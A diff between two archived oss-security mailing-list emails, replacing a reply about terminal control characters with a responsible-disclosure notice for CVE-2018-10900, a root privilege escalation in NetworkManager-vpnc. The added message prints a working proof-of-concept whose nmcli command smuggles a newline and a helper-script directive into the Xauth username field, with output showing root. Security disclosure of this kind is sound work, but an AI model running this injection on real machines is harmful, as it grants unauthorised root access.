@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1505" "Thursday" "12" "April" "2018" "15:31:19" "-0700" "Russ Allbery" "eagle@eyrie.org" "<87efjkoy4o.fsf@hope.eyrie.org>" "31" "Re: [oss-security] Re: Terminal Control Chars" nil nil nil "4" "2018041222:31:19" "[oss-security] Re: Terminal Control Chars" (number mark "U       eagle@eyrie. Apr 12   31/1505  " thread-indent "\"Re: [oss-security] Re: Terminal Control Chars\"\n") "<E1f6jcD-0002pc-T3@rmmprod07.runbox>" ("<E1f6jcD-0002pc-T3@rmmprod07.runbox>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1543" "Friday" "20" "July" "2018" "11:38:39" "+0200" "Lubomir Rintel" "lkundrak@v3.sk" "<c3f99b35b65fa7d78317ca62f32046eab71596b9.camel@v3.sk>" "52" "[oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation" nil nil nil "7" "2018072009:38:39" "[oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation" (number mark "U       lkundrak@v3. Jul 20   52/1543  " thread-indent "\"[oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 23812 invoked by uid 550); 12 Apr 2018 22:31:33 -0000
+Received: (qmail 15505 invoked by uid 550); 20 Jul 2018 09:40:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,49 +12,67 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23793 invoked from network); 12 Apr 2018 22:31:33 -0000
-From: Russ Allbery <eagle@eyrie.org>
-To: "David A. Wheeler" <dwheeler@dwheeler.com>
-Cc: "oss-security" <oss-security@lists.openwall.com>
-In-Reply-To: <E1f6jcD-0002pc-T3@rmmprod07.runbox> (David A. Wheeler's message
-	of "Thu, 12 Apr 2018 17:18:45 -0400 (EDT)")
-Organization: The Eyrie
-References: <E1f6jcD-0002pc-T3@rmmprod07.runbox>
-User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/25.2 (gnu/linux)
-Date: Thu, 12 Apr 2018 15:31:19 -0700
-Message-ID: <87efjkoy4o.fsf@hope.eyrie.org>
-MIME-Version: 1.0
-Content-Type: text/plain
-Subject: Re: [oss-security] Re: Terminal Control Chars
+Received: (qmail 13557 invoked from network); 20 Jul 2018 09:38:55 -0000
+X-Virus-Scanned: amavisd-new at zimbra.v3.sk
+Message-ID: <c3f99b35b65fa7d78317ca62f32046eab71596b9.camel@v3.sk>
+From: Lubomir Rintel <lkundrak@v3.sk>
+To: oss-security@lists.openwall.com
+Date: Fri, 20 Jul 2018 11:38:39 +0200
+Content-Type: text/plain; charset="UTF-8"
+X-Mailer: Evolution 3.28.3 (3.28.3-1.fc28) 
+Mime-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation
 
-"David A. Wheeler" <dwheeler@dwheeler.com> writes:
-> Russ Allbery:
+Hi,
 
->> I think a useful definition of "control character" in this context (and
->> I realize this doesn't exactly match the ASCII definition) is a
->> character that results in an action other than insertion being taken...
->> CR and LF would not be control characters in that definition, since
->> they insert a newline and don't cause an action. Similarly, TAB
->> wouldn't be a control character in that definition.
+NetworkManager-vpnc-1.2.6 fixes a local authenticated root bug.
 
-> As you noted, that definition doesn't match the ASCII definition, but I
-> also think it's misleading.  If someone pastes a CR/LF into a shell
-> prompt, it certainly *DOES* cause an action, namely, execution of that
-> line.  That's probably not what you meant by "action", but from a
-> security point-of-view, causing a script to execute is rather important
-> :-).
+The bug was responsibly disclosed to us by Denis Andzakovic. Please
+credit him if you issue an advisory for a product that ships the
+affected code. His original advisory should be available soon at
+https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
 
-That's a fair counterpoint.
+CVE Number: CVE-2018-10900
 
-That unfortunately means that the specification one wants is to deny
-pasting control messages except for a particular set (since you're
-certainly not going to want to stop pasting of a newline sequence, and
-probably not pasting of tabs), and then you have to find the right way to
-define that set of characters that you want to allow.
+Original Report (will be available soon):
+https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
 
-I have some "I know it when I see it" definition in my head, but it's hard
-to be precise without listing out the specific characters that I would
-allow and that I would disallow (at least as interpreted commands).
+Patch:
+https://gitlab.gnome.org/GNOME/NetworkManager-vpnc/commit/07ac18a32b4
 
--- 
-Russ Allbery (eagle@eyrie.org)              <http://www.eyrie.org/~eagle/>
+Release Notes:
+https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.news
+
+Patched Version:
+https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.tar.xz
+
+The exploit code for QA and documentation purposes follows:
+
+cat <<EOF >/tmp/helper
+#!/bin/bash
+id >/tmp/pwned
+EOF
+chmod +x /tmp/helper
+nmcli c add con-name poc type vpn ifname '*' vpn-type vpnc \
++vpn.data "IKE DH Group = dh2" \
++vpn.data "IPSec ID = bar" \
++vpn.data "IPSec gateway = 127.0.0.1" \
++vpn.data "IPSec secret-flags = 4" \
++vpn.data "Local Port = 0" \
++vpn.data "NAT Traversal Mode = natt" \
++vpn.data "Perfect Forward Secrecy = server" \
++vpn.data "Vendor = cisco" \
++vpn.data "Xauth password-flags = 4" \
++vpn.data "Xauth username = foo$(echo; echo Password helper
+/tmp/helper)" \
++vpn.data "ipsec-secret-type = save" \
++vpn.data "xauth-password-type = save"
+nmcli c up poc
+
+$ cat /tmp/pwned
+uid=0(root) gid=0(root) groups=0(root)
+context=system_u:system_r:vpnc_t:s0
+
+Take care,
+Lubo
